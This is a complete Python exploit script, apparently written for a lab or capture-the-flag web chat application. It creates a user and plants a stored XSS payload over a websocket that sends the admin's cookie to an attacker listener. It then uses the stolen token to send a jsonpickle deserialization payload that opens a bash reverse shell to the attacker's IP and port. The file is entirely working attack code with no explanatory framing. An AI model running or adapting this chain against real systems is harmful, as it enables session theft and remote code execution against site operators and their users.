#!/usr/bin/env python3

import argparse
import traceback
import requests
import http.server
import asyncio
import websockets
import socketserver
import threading
import time
import sys
import os
import signal
from urllib.parse import urlparse, parse_qs

"""
Usage:
/usr/bin/python3 rce.py <target_ip> <attacker_ip> <listener_port>
"""


# Global variables
admin_token_received = False
server_running = False
TARGET_HOST = None  # Will be set from CLI args


class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global admin_token_received

        if self.path.startswith('/token?token='):
            try:
                parsed_url = urlparse(self.path)
                query_params = parse_qs(parsed_url.query)
                admin_token = query_params.get('token', [''])[0]

                if admin_token:
                    print(f"\n[+] Admin token received: {admin_token}")

                    with open("admin_token.txt", "w", encoding="utf-8") as f:
                        f.write(admin_token)

                    admin_token_received = True

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b'Token received successfully!')
                else:
                    print("[-] Empty admin token received")
                    self.send_error(400, "Empty token")

            except Exception as e:
                print(f"[-] Error processing token: {e}")
                self.send_error(500, "Server error")
        else:
            super().do_GET()


def start_http_server(port=80, timeout=300):
    global server_running
    try:
        with socketserver.TCPServer(("", port), TokenHandler) as httpd:
            server_running = True
            print(f"[+] HTTP Server started on port {port}")
            print(f"[+] Waiting for admin token (timeout: {timeout}s)...")

            httpd.timeout = 1
            start_time = time.time()

            while server_running and (time.time() - start_time) < timeout:
                httpd.handle_request()
                if admin_token_received:
                    print("[+] Token received, shutting down server")
                    break

            if not admin_token_received:
                print(f"[-] Timeout reached ({timeout}s), no token received")

    except PermissionError:
        print(f"[-] Permission denied for port {port}. Try running as root/administrator")
    except OSError as e:
        if e.errno == 98:
            print(f"[-] Port {port} is already in use")
        else:
            print(f"[-] Error starting HTTP server: {e}")
    except Exception as e:
        print(f"[-] Unexpected server error: {e}")
    finally:
        server_running = False


def createAcc():
    crtUsrUrl = f"http://{TARGET_HOST}:8000/user/create"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": f"http://{TARGET_HOST}:8000/create_user.html",
        "Content-Type": "application/json",
        "Origin": f"http://{TARGET_HOST}:8000"
    }
    crtUsrJson = {
        "email": "john@doe.ltd",
        "full_name": "John Doe",
        "password": "Meomeo!1234",
        "username": "johndoe"
    }
    try:
        crtUsrRes = requests.post(crtUsrUrl, headers=headers, json=crtUsrJson)
        if "johndoe" in crtUsrRes.text:
            print("[+] User johndoe:Meomeo!1234 has been created successfully")
            print("[*] Logging you in...")
            lgnUrl = f"http://{TARGET_HOST}:8000/token"
            lgnHeaders = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": f"http://{TARGET_HOST}:8000/login.html",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": f"http://{TARGET_HOST}:8000",
                "Connection": "keep-alive",
                "Priority": "u=0"
            }
            lgnData = {"username": "johndoe", "password": "Meomeo!1234"}
            lgnRes = requests.post(lgnUrl, headers=lgnHeaders, data=lgnData)
            if "access_token" in lgnRes.text:
                print("[+] Logged in successfully")
                data = lgnRes.json()
                john_access_token = data.get("access_token")
                print(f"[+] johndoe's access token: {john_access_token}")
                return john_access_token
            else:
                print("[-] Failed to log you in")
        else:
            print("[-] Failed to create the account")
            print(crtUsrRes.text)
    except Exception as e:
        print("[-] Error creating new user:", e)
        traceback.print_exc()


async def send_message(lhost, john_auth_token):
    xss_payload = f"""<img src=x onerror="new Image().src='http://{lhost}/token?'+document.cookie">"""
    ws_url = f"ws://{TARGET_HOST}:8000/send-message?token={john_auth_token}&group_id=13"

    async with websockets.connect(ws_url, origin=f"http://{TARGET_HOST}:8000") as websocket:
        await websocket.send(xss_payload)
        print("[+] Payload sent:", xss_payload)


def xss(lhost, server_port=80):
    john_auth_token = createAcc()
    print("[*] Joining a group with the admin...")
    joinGrpUrl = f"http://{TARGET_HOST}:8000/group/join?address=admin"
    cookies = {"token": john_auth_token, "username": "johndoe"}
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": f"http://{TARGET_HOST}:8000/index.html",
        "Authorization": f"Bearer {john_auth_token}",
        "Origin": f"http://{TARGET_HOST}:8000"
    }
    try:
        joinGrpRes = requests.post(joinGrpUrl, headers=headers, cookies=cookies)
        if "true" in joinGrpRes.text:
            print("[+] Joined successfully.")
            print("[*] Delivering the XSS attack against the admin...")

            server_thread = threading.Thread(target=start_http_server, args=(server_port, 300), daemon=True)
            server_thread.start()

            while not server_running:
                time.sleep(0.1)

            asyncio.run(send_message(lhost, john_auth_token))

            print("[+] XSS attack delivered successfully!")
            print("[+] Waiting for admin token...")

            timeout = 300
            start_time = time.time()

            while time.time() - start_time < timeout and not admin_token_received:
                time.sleep(1)

            if admin_token_received:
                print("[+] Admin token successfully exfiltrated!")
                return True
            else:
                print("[-] Timeout waiting for admin token")
                return False
        else:
            print("[-] Failed to join the admin's group")
    except Exception as e:
        print("[-] Error joining the group with the admin:", e)
        traceback.print_exc()


def signal_handler(sig, frame):
    global server_running
    print("\n[*] Shutting down...")
    server_running = False
    sys.exit(0)


def rce(lhost, lport, admin_access_token):
    updt_url = f"http://{TARGET_HOST}:8000/api/update-preferences?user_id=10"
    token = admin_access_token
    cookies = {"token": token, "username": "admin", "group": "13", "group_name": "Public Discussion"}
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Authorization": f"Bearer {token}",
        "Referer": f"http://{TARGET_HOST}:8000/",
        "Content-Type": "application/json",
        "Origin": f"http://{TARGET_HOST}:8000"
    }
    updt_json = {
        "py/reduce": [
            {"py/type": "subprocess.Popen"},
            {"py/tuple": [{"py/tuple": ["bash", "-c", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"]}]}
        ]
    }
    print(f"[*] Payload: {updt_json}")
    try:
        updt_res = requests.post(updt_url, headers=headers, cookies=cookies, json=updt_json)
        if "Preferences Successfully Updated!" in updt_res.text:
            print("[+] Malicious serialized object has been sent successfully.")
            print("[*] Triggering the Reverse Shell")
            trg_url = f"http://{TARGET_HOST}:8000/api/get-preferences?user_id=10"
            trg_res = requests.get(trg_url, headers=headers, cookies=cookies)
            if "An unexpected error occurred" in trg_res.text:
                print("[+] Reverse shell has been triggered. Check your listener!")
            else:
                print("[-] Failed to trigger the reverse shell")
        else:
            print("[-] Failed to send the malicious serialized object")
    except Exception as e:
        print("[-] Error sending the serialized object request:", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description='Exfiltrate the adminToken')
    parser.add_argument("host", help='Target host/IP address')
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help='Netcat listener port')
    args = parser.parse_args()

    global TARGET_HOST
    TARGET_HOST = args.host

    signal.signal(signal.SIGINT, signal_handler)

    try:
        success = xss(args.lhost)

        if success:
            print("[+] Exploit completed successfully!")
            if os.path.exists("admin_token.txt"):
                with open("admin_token.txt", "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    jwt = content.split(";")[0]  # Take the first part before the semicolon

                    print(f"[+] Admin token saved to admin_token.txt: {jwt}")
                    rce(args.lhost, args.lport, jwt)
            return 0
        else:
            print("[-] Exploit failed")
            return 1
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
